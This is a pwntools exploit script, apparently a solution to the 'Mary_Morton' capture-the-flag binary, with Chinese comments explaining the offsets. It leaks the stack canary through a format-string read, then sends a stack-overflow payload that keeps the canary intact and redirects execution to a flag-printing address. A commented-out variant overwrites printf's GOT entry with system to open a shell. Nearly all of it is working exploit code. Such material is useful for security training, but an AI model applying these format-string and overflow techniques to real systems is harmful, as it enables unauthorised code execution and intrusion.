from pwn import *

# 格式化字符串泄漏canary, 然后栈溢出
# https://blog.csdn.net/qq_43647628/article/details/120088066
# scanf存放buf的地址与printf格式化字符串形参相对偏移为6
# buf与canary字符串距离为0x90-0x8=0x88，占17个内存单元
# canary与printf格式化字符串形参相对偏移为6+17=23
context.log_level = 'debug'
# sh = gdb.debug("./Mary_Morton")
sh = process("./Mary_Morton")
# sh = remote("61.147.171.105", 59931)

# 栈溢出
cat_flag = 0x04008DA
sh.sendlineafter("battle \n", b'2')
payload1 = b'%23$p'.ljust(0x7f, b"\x00")    # read机制,填满第三个参数才结束
sh.send(payload1)
sh.recvuntil('0x')
canary = int(sh.recv(16), 16)
print(hex(canary))
sh.sendlineafter("battle \n", b'1')
payload2 = cyclic(0x88) + p64(canary) + b'deadbeef' + p64(0x04009D9)+ p64(cat_flag)
# gdb.attach(sh)
sh.send(payload2)
sh.recv()
sh.interactive()

# # # 格式化字符串修改got
# elf = ELF("./Mary_Morton")
# system_plt = elf.plt['system']
# printf_got = elf.got['printf']

# print(hex(printf_got))
# print(hex(system_plt))

# sh.sendlineafter("Exit the battle \n", b'2')
# fmt = 'a%' + str(system_plt-1) + 'c'
# # payloa1 = p64(printf_got) + fmt.encode('utf-8') + b'%6$lln'  # 64位容易有00截断
# # payloa1 = fmt.encode('utf-8') + b'%8$lln'+p64(printf_got)
# # payloa1 = fmtstr_payload(6, {printf_got:system_plt},write_size='short').ljust(0x7f,b'\x00')
# payloa1 = bytes(fmt, encoding='ascii') + b'%8$lln'+p64(printf_got)
# sh.sendline(payloa1)
# sh.sendlineafter("Exit the battle \n", b'2')
# payloa2 = b'/bin/sh\x00'
# sh.sendline(payloa2)
# sh.interactive()

